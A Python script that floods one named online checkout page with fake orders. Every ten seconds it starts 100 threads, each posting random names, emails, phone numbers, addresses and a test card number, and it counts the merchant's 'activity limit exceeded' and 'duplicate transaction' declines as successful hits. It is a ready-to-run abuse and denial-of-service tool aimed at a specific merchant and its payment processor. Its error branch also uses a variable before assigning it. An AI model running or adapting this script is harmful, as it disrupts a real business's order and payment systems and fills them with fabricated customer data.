import requests, random, string, names, threading, time
import urllib.parse
from random_address import real_random_address
from requests.structures import CaseInsensitiveDict

success = 0
failed = 0

def generateRandEmail():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(8,12))) + "%40gmail.com"

def generateRandNumber():
    return ''.join(random.choice(string.digits) for _ in range(10))

def generateRandName():
    return names.get_full_name().split(" ")

def generateRandAddress():
    return real_random_address()

testCCNumber = "5555555555554444"
testMonth = "03"
testYear = "2030"
testCVV = "737"

url = "https://ocf2v3.axiologycomitatus.com/reserving"

headers = CaseInsensitiveDict()
headers["content-type"] = "application/x-www-form-urlencoded"
headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"

def sendRequest():
    global success
    global failed
    session = requests.Session()
    
    initialRequest = session.get(url, headers=headers)

    addressToPersist = generateRandAddress()
    
    data = f"billCountry=US&billShipSame=1&sf-pst-custom1=pv1&sf-pst-merchantInitiated=1&country=US&firstName={generateRandName()[0]}&lastName={generateRandName()[1]}&emailAddress={generateRandEmail()}&phone={generateRandNumber()}&address1={addressToPersist['address1'].replace(' ', '+')}&zip={addressToPersist['postalCode']}&city={addressToPersist['city'].replace(' ', '+')}&state={addressToPersist['state']}&cardNumber={testCCNumber}&cardMonth={testMonth}&cardSecurityCode={testCVV}&cardYear={testYear}&sfVirtualWallet=&gjsType=Konnektive+Import+Order&gjsSfPlugin=sf-konnektive&pluginAction=Konnektive+Import+Order&sf-plugin-name=b6e81e2f-0294-4481-86e1-3f69664ed112&campaignId=160&product=750&gjsSfPaayAmount=29.90&gjsSfPaayRebillAmount=199.90&gjsSfPaayChangeSettingsEnabled=&gjsSfPaayNewProductId=1201%3B1202&gjsSfPaayNewBalancerId=3&gjsSfRebillproduct=749&gjsSfRebillbalancer=2&triggerMastercardConsent=0&orderVault="

    req = session.post(url, headers=headers, data=data)
    
    found = False
    
    if req.status_code == 302:
        req2 = session.get(url, headers=headers)
    else:
        open("debug3.txt", "w").write(req2.text)
        print(req.text)
        print(req.status_code)
        print(f"Something went wrong with initial request | Hit: {success} | Failed: {failed}")
        failed+=1
        return
    
    
    for line in req2.text.splitlines():
        if "Transaction Declined: Activity limit exceeded merchantId:" in line:
            found = True
            print(f"Success! | Transaction ID: {line.split('Transaction Declined: Activity limit exceeded merchantId:')[1].split('<')[0]} | Hit: {success} | Failed: {failed}")
            success+=1
            break
        elif "Transaction Declined: Duplicate transaction REFID:" in line:
            found = True
            print(f"Success! (Duplicate) | Transaction ID: {line.split('Transaction Declined: Duplicate transaction REFID:')[1].split('<')[0]} | Hit: {success} | Failed: {failed}")
            success+=1
            break;
            
    if not found:
        open("debug2.txt", "w").write(req2.text)
        #print(req2.text)
        print(req2.status_code)
        print(f"Something went wrong | Hit: {success} | Failed: {failed}")
        failed+=1
        
i = 0

while True:
    print(f"Wave {i} | Sending requests... | Hit: {success} | Failed: {failed}")
    for _ in range(100):
        threading.Thread(target=sendRequest, daemon=True).start()

    time.sleep(10)
    i+=1
